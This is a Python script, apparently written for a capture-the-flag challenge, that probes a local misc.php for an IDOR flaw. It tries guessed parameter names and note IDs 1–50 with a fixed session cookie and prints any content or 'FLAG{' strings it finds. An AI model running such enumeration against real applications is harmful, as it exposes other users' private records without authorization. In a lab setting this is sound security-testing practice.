import requests
import time

# Configuration
base_url = "http://127.0.0.1/misc.php"
session_cookie = "17f3f417d868573c3079e3f6ee928eb6"

cookies = {'PHPSESSID': session_cookie}

# Parameter names and note IDs to test
param_names = ['note_id', 'noteid', 'id', 'note', 'nid']
note_ids = range(1, 51)

print("[*] Starting IDOR testing on misc.php")
print(f"[*] Session cookie: {session_cookie[:10]}...")
print("-" * 60)

successful = []

for param in param_names:
    print(f"\n[+] Testing parameter: {param}")
    
    for nid in note_ids:
        # Test without action parameter
        try:
            params = {param: nid}
            resp = requests.get(base_url, cookies=cookies, params=params, timeout=10)
            
            # Print any response with content
            if resp.text and len(resp.text.strip()) > 0:
                print(f"\n[!] Content found: {param}={nid}")
                print(f"    Status: {resp.status_code}")
                print(f"    Length: {len(resp.text)}")
                print(f"    First 200 chars: {resp.text[:200]}")
                if 'FLAG{' in resp.text:
                    print(f"    *** FLAG FOUND! ***")
                successful.append({'param': param, 'nid': nid, 'status': resp.status_code, 'len': len(resp.text)})
                
        except Exception as e:
            print(f"[-] Error on {param}={nid}: {e}")
            time.sleep(0.5)
        
        # Test with action=view
        try:
            params = {param: nid, 'action': 'view'}
            resp = requests.get(base_url, cookies=cookies, params=params, timeout=10)
            
            # Print any response with content
            if resp.text and len(resp.text.strip()) > 0:
                print(f"\n[!] Content found: {param}={nid} + action=view")
                print(f"    Status: {resp.status_code}")
                print(f"    Length: {len(resp.text)}")
                print(f"    First 200 chars: {resp.text[:200]}")
                if 'FLAG{' in resp.text:
                    print(f"    *** FLAG FOUND! ***")
                successful.append({'param': param, 'nid': nid, 'action': 'view', 'status': resp.status_code, 'len': len(resp.text)})
                
        except Exception as e:
            print(f"[-] Error on {param}={nid}+action: {e}")
            time.sleep(0.5)

print("\n" + "=" * 60)
print(f"[*] Test completed. Found {len(successful)} accessible notes.")

if successful:
    print("\n[!] POTENTIAL IDOR VULNERABILITY!")
    print("Accessible notes:")
    for s in successful:
        action = f"+{s.get('action', 'none')}" if 'action' in s else ''
        print(f"  - {s['param']}={s['nid']}{action} (Status: {s['status']}, Len: {s['len']})")
else:
    print("[-] No accessible notes found.")

